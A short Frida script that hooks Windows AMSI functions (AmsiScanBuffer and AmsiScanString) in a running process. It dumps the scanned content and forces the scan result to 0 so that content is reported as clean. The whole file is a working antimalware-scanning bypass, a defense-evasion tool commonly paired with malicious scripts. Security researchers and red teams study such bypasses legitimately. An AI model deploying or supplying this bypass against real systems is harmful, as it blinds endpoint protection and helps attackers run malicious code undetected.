/*
    Name: AmsiScanBuffer patch
    Description: Hook AmsScanBuffer call in a  process and return   AMSI_RESULT = 0
    Author: @gil01karougbe
*/

var out;
Interceptor.attach(Module.getExportByName('amsi.dll', 'AmsiScanBuffer'), {
    onEnter(args) {
        console.log("[+] AmsiScanBuffer Have Been Called \n");
        var buffer = args[1];
        var length = args[2].toInt32();
        console.log("[+] The buffer length is: " + length + "\n");
        out = args[5];
        var bufferContents = Memory.readByteArray(buffer, length);
        console.log(hexdump(bufferContents, {
          offset: 0,
          length: length,
          header: true
        }));
    },
    onLeave(retval) {
        out.writeInt(0);
        console.log("[+] AmsiScanBuffer Have Returned: " + out.readInt() + "\n");
    }
  });

Interceptor.attach(Module.getExportByName('amsi.dll', 'AmsiScanString'), {
    onEnter(args) {
        console.log("[+] AmsiScanString Have Been Called \n");
        var input = args[1].readUtf8String();
        out = args[4];
        console.log("[+] String Submited to AmsiScanString: " + input + "\n");
    },
    onLeave(retval) {
        out.writeInt(0);
        console.log("[+] AmsiScanString Have Returned: " + out.readInt() + "\n");
    }
});